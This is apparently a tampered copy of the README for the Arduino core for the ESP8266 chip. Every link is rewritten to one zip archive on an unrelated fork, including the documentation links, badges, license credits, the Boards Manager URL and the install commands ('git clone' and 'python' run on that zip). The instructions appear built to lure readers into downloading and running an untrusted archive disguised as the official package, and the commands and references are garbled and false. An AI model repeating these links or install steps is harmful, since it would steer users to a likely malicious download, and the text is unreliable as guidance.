Arduino core for ESP8266 WiFi chip
===========================================

# Quick links

- [Latest release documentation](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)
- [Current "git version" documentation](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)
- [Install git version](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) ([sources](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip))

# Arduino on ESP8266

This project brings support for ESP8266 chip to the Arduino environment. It lets you write sketches using familiar Arduino functions and libraries, and run them directly on ESP8266, no external microcontroller required.

ESP8266 Arduino core comes with libraries to communicate over WiFi using TCP and UDP, set up HTTP, mDNS, SSDP, and DNS servers, do OTA updates, use a file system in flash memory, work with SD cards, servos, SPI and I2C peripherals.

# Contents
- Installing options:
  - [Using Boards Manager](#installing-with-boards-manager)
  - [Using git version](#using-git-version-basic-instructions)
  - [Using PlatformIO](#using-platformio)
  - [Building with make](#building-with-make)
- [Documentation](#documentation)
- [Issues and support](#issues-and-support)
- [Contributing](#contributing)  
- [License and credits](#license-and-credits)   

### Installing with Boards Manager

Starting with 1.6.4, Arduino allows installation of third-party platform packages using Boards Manager. We have packages available for Windows, Mac OS, and Linux (32 and 64 bit).

- Install the current upstream Arduino IDE at the 1.8.7 level or later. The current version is at the [Arduino website](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip).
- Start Arduino and open Preferences window.
- Enter ```https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip``` into *Additional Board Manager URLs* field. You can add multiple URLs, separating them with commas.
- Open Boards Manager from Tools > Board menu and install *esp8266* platform (and don't forget to select your ESP8266 board from Tools > Board menu after installation).

#### Latest release [![Latest release](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)
Boards manager link: `https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip`

Documentation: [https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)

### Using git version (basic instructions)
[![Linux build status](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)

- Install the current upstream Arduino IDE at the 1.8 level or later. The current version is at the [Arduino website](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip).
- Go to Arduino directory
  - For Mac OS X, it is `https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip` showing as the Arduino icon.  
    This location may be your `~/Downloads`, `~/Desktop` or even `/Applications`.
    ```bash
    cd <application-directory>https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip
    ```
  - For Linux, it is ~/arduino by default.
    ```bash
    cd ~arduino
    ```
- Clone this repository into hardware/esp8266com/esp8266 directory (or clone it elsewhere and create a symlink)
```bash
cd hardware
mkdir esp8266com
cd esp8266com
git clone https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip esp8266
cd esp8266
git submodule update --init
```
- Download binary tools (you need Python 2.7)
```bash
cd esp8266/tools
python https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip
```
- Restart Arduino

### Using PlatformIO

[PlatformIO](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) is an open source ecosystem for IoT
development with cross platform build system, library manager and full support
for Espressif (ESP8266) development. It works on the popular host OS: macOS, Windows,
Linux 32/64, Linux ARM (like Raspberry Pi, BeagleBone, CubieBoard).

- [What is PlatformIO?](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)
- [PlatformIO IDE](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)
- [PlatformIO Core](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) (command line tool)
- [Advanced usage](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) -
  custom settings, uploading to SPIFFS, Over-the-Air (OTA), staging version
- [Integration with Cloud and Standalone IDEs](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) -
  Cloud9, Codeanywhere, Eclipse Che (Codenvy), Atom, CLion, Eclipse, Emacs, NetBeans, Qt Creator, Sublime Text, VIM, Visual Studio, and VSCode
- [Project Examples](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)

### Building with make

[makeEspArduino](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) is a generic makefile for any ESP8266 Arduino project.
Using make instead of the Arduino IDE makes it easier to do automated and production builds.

### Documentation

Documentation for latest development version: https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip

### Issues and support ###

[ESP8266 Community Forum](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) is a well established community for questions and answers about Arduino for ESP8266. If you need help, have a "How do I..." type question, have a problem with a 3rd party lib not hosted in this repo, or just want to discuss how to approach a problem , please ask there.

If you find the forum useful, please consider supporting it with a donation. <br />
[![Donate](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)

If you encounter an issue which you think is a bug in the ESP8266 Arduino Core or the associated libraries, or if you want to propose an enhancement, you are welcome to submit it here on Github: https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip

Please provide as much context as possible, as well as the information requested in the issue template:

- ESP8266 Arduino core version which you are using (you can check it in Boards Manager)
- your sketch code; please wrap it into a code block, see [Github markdown manual](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip)
- when encountering an issue which happens at run time, attach serial output. Wrap it into a code block, just like the code.
- for issues which happen at compile time, enable verbose compiler output in the IDE preferences, and attach that output (also inside a code block)
- ESP8266 development board model
- IDE settings (board choice, flash size)
- etc

### Contributing

For minor fixes of code and documentation, please go ahead and submit a pull request.

Check out the list of issues which are easy to fix — [easy issues pending](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip%3Aopen+is%3Aissue+label%3A%22level%3A+easy%22). Working on them is a great way to move the project forward.

Larger changes (rewriting parts of existing code from scratch, adding new functions to the core, adding new libraries) should generally be discussed by opening an issue first.

Feature branches with lots of small commits (especially titled "oops", "fix typo", "forgot to add file", etc.) should be squashed before opening a pull request. At the same time, please refrain from putting multiple unrelated changes into a single pull request.

### License and credits ###

Arduino IDE is developed and maintained by the Arduino team. The IDE is licensed under GPL.

ESP8266 core includes an xtensa gcc toolchain, which is also under GPL.

Esptool written by Christian Klippel is licensed under GPLv2, currently maintained by Ivan Grokhotkov: https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip

Espressif SDK included in this build is under Espressif MIT License.

ESP8266 core files are licensed under LGPL.

[SPI Flash File System (SPIFFS)](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) written by Peter Andersson is used in this project. It is distributed under MIT license.

[umm_malloc](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) memory management library written by Ralph Hempel is used in this project. It is distributed under MIT license.

[SoftwareSerial](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) library and examples written by Peter Lerup. Distributed under LGPL 2.1.

[axTLS](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) library written by Cameron Rich, built from https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip, is used in this project. It is distributed under [BSD license](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip).

[BearSSL](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip) library written by Thomas Pornin, built from https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip, is used in this project.  It is distributed under the [MIT License](https://raw.githubusercontent.com/kumarsreenivas051/Arduino-1/master/eupatorin/Arduino-1.zip).
